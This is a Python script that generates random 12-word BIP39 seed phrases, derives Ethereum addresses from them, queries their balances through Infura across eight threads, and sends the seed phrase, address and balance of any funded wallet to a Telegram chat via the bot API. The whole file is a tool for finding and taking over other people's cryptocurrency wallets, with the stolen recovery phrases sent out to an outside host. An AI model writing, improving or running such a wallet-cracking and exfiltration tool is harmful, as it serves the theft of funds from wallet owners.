import os
import sys
import random
import requests
import logging
from web3 import Web3
from eth_account import Account
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39MnemonicValidator
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Configure logging
logging.basicConfig(filename='app.log', filemode='w', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Environment variables for API keys and URLs
INFURA_URL = os.getenv('INFURA_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Initialize Web3 instances
web3_eth = Web3(Web3.HTTPProvider(INFURA_URL))

# Counter for tracking empty wallets
true_count = 1

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    if response.status_code != 200:
        logging.error(f'Failed to send message: {response.text}')
    else:
        logging.info('Message sent successfully')

def get_balance_from_mnemonic(mnemonic, coin_type, web3, account_index=0):
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_mst = Bip44.FromSeed(seed_bytes, coin_type)
    bip44_acc = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_acc.AddressIndex(account_index)
    private_key = bip44_addr.PrivateKey().Raw().ToBytes()
    account = Account.from_key(private_key)
    address = account.address
    balance_wei = web3.eth.get_balance(address)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    return address, balance_ether

def get_eth_balance(mnemonic, account_index=0):
    return get_balance_from_mnemonic(mnemonic, Bip44Coins.ETHEREUM, web3_eth, account_index)

def generate_mnemonic_from_wordlist(wordlist):
    return ' '.join(random.choice(wordlist) for _ in range(12))

def is_valid_mnemonic(mnemonic):
    validator = Bip39MnemonicValidator()
    return validator.IsValid(mnemonic)

def process_mnemonic(wordlist):
    global true_count
    while True:
        mnemonic = generate_mnemonic_from_wordlist(wordlist).strip()
        if not is_valid_mnemonic(mnemonic):
            continue
        try:
            eth_address, eth_balance = get_eth_balance(mnemonic)
            if eth_balance > 0:
                message = f'Mnemonic: {mnemonic}\nEthereum Address: {eth_address}\nEthereum Balance: {eth_balance} ETH\n'
                send_telegram_message(message)
                print(colored('Active Wallet Found', 'green', attrs=['bold']))
                print(f'Mnemonic: {mnemonic}\nEthereum Address: {eth_address}\nEthereum Balance: {eth_balance} ETH\n')
                continue
            else:
                print(colored(f'Empty Wallet {true_count} {mnemonic} ', 'red', attrs=['bold']), f'{eth_balance} ETH')
            true_count += 1
        except Exception as e:
            logging.error(f'Error processing mnemonic: {e}')
            continue

def main(wordlist_file):
    with open(wordlist_file, 'r') as file:
        wordlist = file.read().splitlines()
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(process_mnemonic, wordlist) for _ in range(8)]
        for future in futures:
            try:
                future.result()
            except Exception as e:
                logging.error(f'Error in thread execution: {e}')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python mnemonic_balance_checker.py <wordlist_file>")
    else:
        main(sys.argv[1])